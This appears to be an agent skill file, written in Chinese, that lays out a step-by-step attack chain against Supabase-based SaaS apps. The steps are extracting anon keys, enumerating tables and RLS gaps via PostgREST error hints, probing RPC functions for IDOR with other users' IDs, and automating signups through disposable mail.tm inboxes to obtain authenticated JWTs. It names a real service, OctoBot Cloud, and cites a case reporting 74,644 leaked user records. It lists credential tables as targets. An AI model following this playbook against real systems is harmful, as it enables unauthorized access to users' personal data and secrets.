---
name: 行库
description: "Supabase SaaS 渗透: anon key→RLS→RPC IDOR→JWT。触发 supabase.co。"
version: 1.0.0
author: bot2
license: MIT
platforms: [linux, macos, windows]
metadata:
    tags: [supabase, postgrest, rls, idor, pentest, saas, jwt]
    category: daaixianzun
---
# Supabase 后端 SaaS 渗透

Supabase 架构的 SaaS（前端 JS 直接连 PostgREST REST 网关）的标准攻击链。目标特征：
- 前端 bundle 出现 `https://<ref>.supabase.co` 或 `supabaseUrl`/`supabaseAnonKey` 配置
- API 返回 PostgREST JSON 错误：`{"code":"PGRST2xx"}` / `42501` / `42703`
- API 网关要求 `apikey` header（如 `api.<domain>.cloud`，实际是 Supabase 的独立网关）

## 攻击链总览
```
JS bundle 提取 anon key → REST 匿名枚举表/RLS → PGRST hint 挖表名+RPC 名
→ 注册+临时邮箱确认拿 authenticated JWT → RPC IDOR / 业务 API 越权
```

## 1. 提取 Supabase 项目与 anon key
- 抓主站 + 移动端/App 的 JS bundles（Expo/React Native web entry 常含完整 env 配置块）
- 正则提取：`createBrowserClient("<url>","<key>")`、`supabaseUrl`、`supabaseAnonKey`、`createClient(`、`https://[a-z0-9]+\.supabase\.co`
- JWT 正则：`eyJ[A-Za-z0-9_\-\.]{150,}`，解码 payload 确认 `role=anon` + `ref=<project>`
- ⚠️ 多环境多项目：web 生产 / mobile-dev / mobile-staging 常是**独立 Supabase 项目**，各拿各的 anon key
- ⚠️ 生产可用自定义网关域名（如 `api.octobot.cloud`）指向同一项目，直接打网关即可
- 常匿名可调的有用 RPC：`get_project_anon_key`、`get_project_url`、`get_subscribed_products_urls`

## 2. 表枚举 + RLS 测试（核心）
请求：`GET https://<gateway>/rest/v1/<table>?select=*&limit=2` + header `Prefer: count=exact`
- **content-range 判读**：`0-999/73765` = 可读且全量可枚举；`*/0` = 表存在但 RLS 空过滤；`42501` = 表级无 GRANT（连 authenticated 都没有）
- **PGRST205 hint 泄露真实表名**：`"Perhaps you meant the table 'public.xxx'"` → 用猜测表名触发 hint 反推，不是字典爆破
- **列枚举**：`?select=<col>` 返回 42703 = 列不存在；否则列存在（即使 RLS 空）
- **重点测表**：`user_profiles`/`profiles`（最常漏 RLS！）、`users`、`exchange_credentials`、`user_api_keys`、`api_keys`、`credentials`、`user_settings`、`bots`、`bot_configs`、`subscriptions`
- 匿名 SELECT 通但 INSERT/UPDATE 被 42501 拒 = 只读数据泄露漏洞

## 3. RPC 函数枚举 + IDOR
- `POST /rest/v1/rpc/<fn>` 空参 → `PGRST202` 泄露签名：`"Searched for the function public.X with parameter <name>"` 或 `"Perhaps you meant ... public.X(input_bot_id)"`
- 参数名常为 `input_<name>` 前缀（`input_bot_id`/`input_user_id`/`settings_user_id`）
- 高价值 RPC 名：`fill_*_secrets`、`get_*_credentials`、`get_otp_with_auth_key`、`get_bot_rating`、`get_account_rating`、`get_startup_info`
- **RPC IDOR**：用自己的 JWT 调 RPC 传**他人 user_id**，若返回他人数据/句柄 = 越权。`fill_user_settings_secrets` 可为任意用户初始化 auth_secret_id；多次调用返回相同值证明是 get-or-create 可读他人
- ⚠️ 多数高价值函数返回 42501（需 service/更高权限）；能调通的敏感函数就是金矿
- ⚠️ execute_code 大范围 RPC 枚举会 300s 超时 → 用聚焦列表 + sleep(0.3)，不要全笛卡尔积

## 4. 注册 + 临时邮箱确认 → authenticated JWT（关键技巧）
- 需邮箱确认（mailer_autoconfirm:false）时用 mail.tm 免费 API：
  1. `POST https://api.mail.tm/domains` 取域名 → `POST /accounts` 建邮箱 → `POST /token` 拿 api token
  2. `POST <gateway>/auth/v1/signup` {email,password}
  3. 轮询 `GET https://api.mail.tm/messages`(Bearer) 提取 HTML 里 `token=([a-f0-9]{30,})&type=signup`
- **⚠️ 关键坑**：`POST /auth/v1/verify` 常报 `otp_expired`；正确是 **GET** `https://<项目>.supabase.co/auth/v1/verify?token=<t>&type=signup&redirect_to=...` → 303，Location/body 含 `#access_token=eyJ...` 即确认成功
- `POST /auth/v1/token?grant_type=password` → access_token = authenticated JWT
- ⚠️ JWT 约 2-3 小时过期（PGRST303），重新登录刷新，保存 refresh_token
- `POST /auth/v1/resend` {type:signup,email} 可重发（有 429 限速）；`GET /auth/v1/settings` 泄露支持的 provider

## 5. 业务 API / Edge Functions 面
- 后端常暴露 `services.<domain>/business/`（Flask）与 `/cloud/`（Express）：POST `{type:<op>, auth:{user_id, user_email, user_settings_auth_secret_id}, ...}` —— **信任 user_id 字段**，是 IDOR 面
- business op 名在前端 `fetchBusinessApi(base, ctx, '<op>', params)`；报错 `"unknown request_type"` 可枚举 op
- Edge Functions `/functions/v1/<name>`：`create-auth-token` 需 `User-Auth-Token` header；`os-paid-package-api` 需认证用户；不存在返回 NOT_FOUND JSON
- 带无效 exchange_credential_id 时 business API 返回 500（尝试连交易所）= 内部解密在服务端

## 6. 加密密钥的现实
- 密钥表（exchange_credentials）可能连 authenticated 角色都无 GRANT SELECT（42501）→ 仅 service_role 或进程内
- 密文解密发生在运行中的 bot/worker 进程内，API 只返回引用（auth_secret_id）不返回明文
- 拿到 auth_secret_id（解密句柄）≠ 明文；这是 IDOR 上限

## Pitfalls
1. 表 RLS 判读：`[]` ≠ 无数据，是 RLS 过滤；`content-range: */0`同理
2. `Prefer: count=exact` 需配 `-D -` 才见 content-range
3. 跨项目 JWT 不通用（各项目独立 key），报 PGRST301
4. `uid` 是 bash readonly 变量，用 TUID 等别的名
5. anon key 也能查公开表（exchanges/products/news），先区分公开内容表 vs 用户私有表，别把公开数据当漏洞

## References
- references/octobot-cloud-case.md — 实战案例：OctoBot Cloud（74,644 用户泄露 + fill_user_settings_secrets IDOR）